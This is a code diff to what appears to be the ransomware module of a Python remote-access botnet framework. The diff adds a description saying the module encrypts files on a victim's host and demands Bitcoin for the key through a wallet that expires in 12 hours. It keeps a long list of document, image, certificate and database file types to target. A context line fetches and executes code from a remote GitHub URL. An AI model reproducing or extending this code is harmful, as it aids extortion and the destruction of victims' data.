@@ -18,10 +18,10 @@ exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/mas
 sys.modules['util'] = util
 
 # globals
-packages  = ['_winreg','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP']
+packages = ['_winreg','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP']
 platforms = ['win32']
-threads   = {}
-tasks     = Queue.Queue()
+threads = {}
+tasks = Queue.Queue()
 filetypes = ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg',
 	     '.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc',
              '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx',
@@ -31,10 +31,18 @@ filetypes = ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.
              '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw',  '.r3d', '.ptx','.css',
              '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.html',
              '.css','.js','.rb','.xml','.wmi','.sh','.asp','.aspx','.plist','.sql','.vbs','.ps1','.sqlite']
+usage = 'ransom <encrypt/decrypt/payment>'
+description = """
+Encrypt the files on a client host machine and ransom the decryption key
+back to the currently logged-in user for a payment in Bitcoin to a randomly
+generated temporary wallet address that expires in 12 hours
+"""
 
 # setup
-util.is_compatible(platforms, __name__)
-util.imports(packages, __builtins__)
+if util.is_compatible(platforms, __name__):
+    util.imports(packages, globals())
+else:
+    sys.exit()
 
 # main
 def _threader(tasks):
